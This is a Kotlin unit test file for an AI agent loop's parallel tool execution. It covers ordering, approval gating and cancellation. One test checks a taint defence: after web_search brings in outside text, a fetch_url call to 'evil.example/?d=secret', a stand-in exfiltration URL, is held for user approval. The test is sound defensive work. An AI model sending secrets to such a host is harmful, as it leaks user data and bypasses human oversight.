package dev.locus.core.agent

import dev.locus.core.llm.AssistantTurn
import dev.locus.core.llm.ChatEvent
import dev.locus.core.llm.ChatModel
import dev.locus.core.llm.ChatRequest
import dev.locus.core.llm.StopReason
import dev.locus.core.model.ApiFormat
import dev.locus.core.model.ApprovalDecision
import dev.locus.core.model.AuditEntry
import dev.locus.core.model.Conversation
import dev.locus.core.model.Message
import dev.locus.core.model.Part
import dev.locus.core.model.Role
import dev.locus.core.model.ToolPolicy
import dev.locus.core.model.ToolRisk
import dev.locus.core.model.ToolSpec
import kotlinx.coroutines.awaitCancellation
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.launch
import kotlinx.coroutines.test.advanceTimeBy
import kotlinx.coroutines.test.runTest
import kotlinx.serialization.json.JsonObject
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertTrue

/** Calls that only look run at the same time; everything else, and every result, keeps its order. */
class ParallelCallsTest {
    private val conversation = Conversation("c", "t", "p", "system", 0, 0)
    private val user = Message("u", "c", Role.USER, listOf(Part.Text("go")), 0)

    private class Scripted(vararg turns: AssistantTurn) : ChatModel {
        private val queue = ArrayDeque(turns.toList())
        override val format = ApiFormat.OPENAI_CHAT
        override fun stream(request: ChatRequest): Flow<ChatEvent> = flow { emit(ChatEvent.Completed(queue.removeFirst())) }
    }

    private class Store : TranscriptStore {
        val messages = mutableListOf<Message>()
        val audit = mutableListOf<AuditEntry>()
        override suspend fun append(message: Message) { messages += message }
        override suspend fun record(entry: AuditEntry) { audit += entry }
    }

    /** What happened, in order, across every tool and the gate. */
    private class Log {
        val lines = mutableListOf<String>()
        var active = 0
        var maxActive = 0
    }

    private class Timed(
        name: String,
        private val log: Log,
        private val ms: Long,
        override val risk: ToolRisk = ToolRisk.READ,
        private val observation: Boolean = risk == ToolRisk.READ,
        override val runsAlone: Boolean = false,
        private val forever: Boolean = false,
    ) : Tool {
        override val spec = ToolSpec(name, "t", ObjectSchema().string("url", "u", required = false).build())
        override fun describe(args: JsonObject) = name()
        private fun name() = spec.name
        override suspend fun isObservation(args: JsonObject) = observation
        override suspend fun execute(args: JsonObject): ToolResult {
            log.lines += "start ${name()}"
            log.active++
            log.maxActive = maxOf(log.maxActive, log.active)
            try {
                if (forever) awaitCancellation()
                delay(ms)
            } finally {
                log.active--
            }
            log.lines += "end ${name()}"
            return ToolResult("result of ${name()}")
        }
    }

    private fun turn(vararg calls: Pair<String, String>) = AssistantTurn(
        "", calls.mapIndexed { i, (name, args) -> Part.ToolCall("k$i", name, args) }, StopReason.TOOL_USE, ApiFormat.OPENAI_CHAT, null,
    )

    private val done = AssistantTurn("ok", emptyList(), StopReason.END_TURN, ApiFormat.OPENAI_CHAT, null)

    private fun loop(tools: List<Tool>, turn: AssistantTurn, store: Store, log: Log, policies: Map<String, ToolPolicy> = emptyMap(), config: AgentConfig = AgentConfig()): AgentLoop {
        var n = 0
        val gate = ApprovalGate { r -> log.lines += "ask ${r.toolName}"; true }
        return AgentLoop(Scripted(turn, done), ToolRegistry(tools), { t -> policies[t.spec.name] ?: ToolPolicy.ALLOW }, gate, store, config, ids = { "id${n++}" })
    }

    private val Store.results get() = messages.single { it.role == Role.TOOL }.toolResults

    @Test
    fun `consecutive reads run at the same time and results keep the call order`() = runTest {
        val log = Log()
        val store = Store()
        // The first call is the slowest, so it finishes last.
        val tools = listOf(Timed("read_a", log, 300), Timed("read_b", log, 200), Timed("read_c", log, 100))
        val events = loop(tools, turn("read_a" to "{}", "read_b" to "{}", "read_c" to "{}"), store, log).run(conversation, listOf(user)).toList()

        assertEquals(3, log.maxActive)
        assertEquals(listOf("end read_c", "end read_b", "end read_a"), log.lines.filter { it.startsWith("end") })
        assertEquals(300, testScheduler.currentTime)
        assertEquals(listOf("k0", "k1", "k2"), store.results.map { it.callId })
        assertEquals(listOf("result of read_a", "result of read_b", "result of read_c"), store.results.map { it.content })
        assertEquals(listOf("k0", "k1", "k2"), events.filterIsInstance<AgentEvent.ToolFinished>().map { it.callId })
        assertEquals(listOf("k0", "k1", "k2"), store.audit.map { it.callId })
        assertTrue(store.audit.all { it.decision == ApprovalDecision.AUTO_ALLOWED })
    }

    @Test
    fun `calls that ask or write run alone and in order`() = runTest {
        val log = Log()
        val store = Store()
        val tools = listOf(
            Timed("read_a", log, 100), Timed("read_b", log, 100), Timed("read_c", log, 100),
            Timed("asks", log, 100), Timed("write", log, 100, risk = ToolRisk.WRITE),
        )
        val calls = turn("read_a" to "{}", "asks" to "{}", "read_b" to "{}", "read_c" to "{}", "write" to "{}", "read_a" to "{}")
        loop(tools, calls, store, log, policies = mapOf("asks" to ToolPolicy.ASK)).run(conversation, listOf(user)).toList()

        assertEquals(
            listOf(
                "start read_a", "end read_a",
                "ask asks", "start asks", "end asks",
                "start read_b", "start read_c", "end read_b", "end read_c",
                "start write", "end write",
                "start read_a", "end read_a",
            ),
            log.lines,
        )
        assertEquals(2, log.maxActive)
        assertEquals(listOf("k0", "k1", "k2", "k3", "k4", "k5"), store.results.map { it.callId })
    }

    @Test
    fun `tools that must run alone, and runs with parallel reads off, go one at a time`() = runTest {
        val log = Log()
        loop(
            listOf(Timed("browser_snapshot", log, 100, runsAlone = true), Timed("read_a", log, 100)),
            turn("browser_snapshot" to "{}", "read_a" to "{}", "browser_snapshot" to "{}"), Store(), log,
        ).run(conversation, listOf(user)).toList()
        assertEquals(1, log.maxActive)

        val off = Log()
        loop(listOf(Timed("read_a", off, 100), Timed("read_b", off, 100)), turn("read_a" to "{}", "read_b" to "{}"), Store(), off, config = AgentConfig(parallelReads = false))
            .run(conversation, listOf(user)).toList()
        assertEquals(1, off.maxActive)
    }

    @Test
    fun `a read that taint could gate never runs beside one that taints`() = runTest {
        val log = Log()
        val store = Store()
        // web_search brings outside text in; fetch_url to a host the user never named is then held back.
        val tools = listOf(Timed("web_search", log, 100), Timed("fetch_url", log, 100))
        loop(tools, turn("web_search" to "{}", "fetch_url" to """{"url":"https://evil.example/?d=secret"}"""), store, log)
            .run(conversation, listOf(user)).toList()

        assertEquals(1, log.maxActive)
        assertEquals(listOf("start web_search", "end web_search", "ask fetch_url", "start fetch_url", "end fetch_url"), log.lines)
        assertEquals(ApprovalDecision.USER_APPROVED, store.audit.last().decision)
    }

    @Test
    fun `cancelling mid-batch answers every call, in order`() = runTest {
        val log = Log()
        val store = Store()
        val tools = listOf(Timed("read_a", log, 50), Timed("read_b", log, 0, forever = true), Timed("read_c", log, 0, forever = true))
        val job = launch { loop(tools, turn("read_a" to "{}", "read_b" to "{}", "read_c" to "{}"), store, log).run(conversation, listOf(user)).toList() }
        advanceTimeBy(100)
        assertEquals(3, log.maxActive)
        job.cancel()
        job.join()
        val results = store.results
        assertEquals(listOf("k0", "k1", "k2"), results.map { it.callId })
        assertEquals("result of read_a", results[0].content)
        assertTrue(results.drop(1).all { it.isError && "Cancelled" in it.content })
    }
}
